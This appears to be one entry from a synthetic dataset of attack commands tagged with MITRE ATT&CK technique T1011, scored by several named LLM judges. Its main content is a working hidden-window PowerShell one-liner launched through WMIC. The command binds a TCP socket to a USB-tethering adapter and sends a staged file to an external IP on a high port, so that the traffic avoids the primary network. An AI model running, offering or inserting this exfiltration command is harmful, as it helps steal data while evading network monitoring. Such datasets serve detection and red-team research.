{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Remote NDIS*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.199',50888); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.log'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "explanation": "Uses WMIC to invoke PowerShell that binds to a USB tethering (Remote NDIS) adapter and exfiltrates a file to an external host using a high TCP port. This exploits a USB-backed network path distinct from the primary NIC.",
  "rationale_steps": [
    "Detect a USB tethering NIC via its Remote NDIS description.",
    "Bind the TCP client to that interface to force egress over USB tether.",
    "Connect to an uncommon port on the exfiltration server.",
    "Send the selected file over the alternate network medium per T1011.",
    "Refrain from system-level network configuration changes."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-987933e0-e65af2df",
  "source_prompt_hash": "987933e0",
  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 4,
        "syntactic_justification": "Quoting and delimiters are balanced and the WMIC/PowerShell invocation is well-formed, though the pervasive use of backticks before PowerShell variables is unusual and may cause parsing quirks in some contexts.",
        "semantic_score": 4,
        "semantic_justification": "It appropriately targets a USB RNDIS adapter, binds the TCP client to that interface, and transmits a file, aligning with exfiltration over an alternate medium, though operational success depends on the adapterâ€™s presence and the chosen IP (198.51.100.199 is a documentation-only range).",
        "combined_score": 4.0,
        "confidence": 0.66,
        "timestamp": "2025-10-01T00:31:00.040405Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, correct PowerShell syntax with appropriate escape sequences, and valid WMIC process call create syntax.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly aligns with T1011 by identifying a USB tethering network adapter (Remote NDIS), binding to it specifically, and using it to exfiltrate data over TCP to an external server, effectively using an alternate network medium separate from the primary network.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T00:31:03.488448Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes and parentheses, appropriate backtick escaping for PowerShell variables within the WMIC string, and valid PowerShell syntax throughout.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly achieves the claimed intent by programmatically identifying a 'Remote NDIS' adapter, binding a TCP client to its specific IP address, and then exfiltrating a file over this distinct network path, directly aligning with MITRE ATT&CK T1011.",
        "combined_score": 5.0,
        "confidence": 1,
        "timestamp": "2025-10-01T06:13:43.761020Z"
      }
    ],
    "llm_average_syntactic": 4.667,
    "llm_average_semantic": 4.667,
    "llm_average_score": 4.667,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
